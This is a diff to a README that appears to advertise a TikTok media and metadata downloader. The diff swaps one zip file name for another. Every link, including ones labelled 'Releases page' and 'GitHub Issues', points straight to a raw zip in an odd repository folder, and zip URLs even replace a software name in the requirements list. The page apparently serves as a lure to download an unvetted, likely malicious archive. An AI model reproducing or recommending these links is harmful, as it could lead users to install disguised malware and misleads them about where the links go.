@@ -6,18 +6,18 @@ Welcome to the TikTok Media and Metadata Retriever! This tool helps you extract 
 
 ## 📥 Download the Application
 
-[![Download the Latest Release](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/media-metadata-retriever-tiktok-and-v2.8.zip%https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/media-metadata-retriever-tiktok-and-v2.8.zip)](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/media-metadata-retriever-tiktok-and-v2.8.zip)
+[![Download the Latest Release](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/metadata-media-and-retriever-tiktok-2.3.zip%https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/metadata-media-and-retriever-tiktok-2.3.zip)](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/metadata-media-and-retriever-tiktok-2.3.zip)
 
 To get started, first download the application from our Releases page. Click the link below to visit the page where you can find the latest version of the software.
 
-[Visit the Releases Page to Download](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/media-metadata-retriever-tiktok-and-v2.8.zip)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/metadata-media-and-retriever-tiktok-2.3.zip)
 
 ## 💻 System Requirements
 
 For the best experience using the TikTok Media and Metadata Retriever, ensure your system meets the following requirements:
 
 - **Operating System:** Windows 10 or later, macOS High Sierra or later
-- **https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/media-metadata-retriever-tiktok-and-v2.8.zip** Version 12.x or higher
+- **https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/metadata-media-and-retriever-tiktok-2.3.zip** Version 12.x or higher
 - **Internet Connection:** Required for downloading data
 
 ## 📂 Features
@@ -31,7 +31,7 @@ Our application includes several features to simplify your data retrieval:
 ## 📋 How to Install
 
 1. **Download the Application**: 
-   - Visit the [Releases page](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/media-metadata-retriever-tiktok-and-v2.8.zip) and download the latest version.
+   - Visit the [Releases page](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/metadata-media-and-retriever-tiktok-2.3.zip) and download the latest version.
   
 2. **Locate the Downloaded File**:
    - The file will typically be in your "Downloads" folder unless specified otherwise.
@@ -62,7 +62,7 @@ Our application includes several features to simplify your data retrieval:
 If you encounter any issues, consider the following steps:
 
 - **Check Your Internet Connection:** Ensure you are connected to the internet for data retrieval.
-- **Verify System Requirements:** Make sure your operating system and https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/media-metadata-retriever-tiktok-and-v2.8.zip version meet the requirements listed above.
+- **Verify System Requirements:** Make sure your operating system and https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/metadata-media-and-retriever-tiktok-2.3.zip version meet the requirements listed above.
 - **Reinstall Application:** If the software crashes or does not open, try uninstalling and then reinstalling the application.
 
 ## 📚 Additional Resources
@@ -70,7 +70,7 @@ If you encounter any issues, consider the following steps:
 Feel free to explore the following resources for more information:
 
 - **[User Manual](#)**: A detailed guide on all application features.
-- **[GitHub Issues](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/media-metadata-retriever-tiktok-and-v2.8.zip)**: Report any bugs or request new features.
+- **[GitHub Issues](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/metadata-media-and-retriever-tiktok-2.3.zip)**: Report any bugs or request new features.
 - **[Community Discussions](#)**: Join discussions with other users for tips and best practices.
 
 ## 💬 Get in Touch
@@ -81,4 +81,4 @@ If you have questions or need support, reach out via GitHub Issues or any commun
 
 Don't wait! Download the TikTok Media and Metadata Retriever today!
 
-[Download the Latest Release](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/media-metadata-retriever-tiktok-and-v2.8.zip)
+[Download the Latest Release](https://raw.githubusercontent.com/masterprod1/tiktok-media-and-metadata-retriever/main/diaulic/metadata-media-and-retriever-tiktok-2.3.zip)
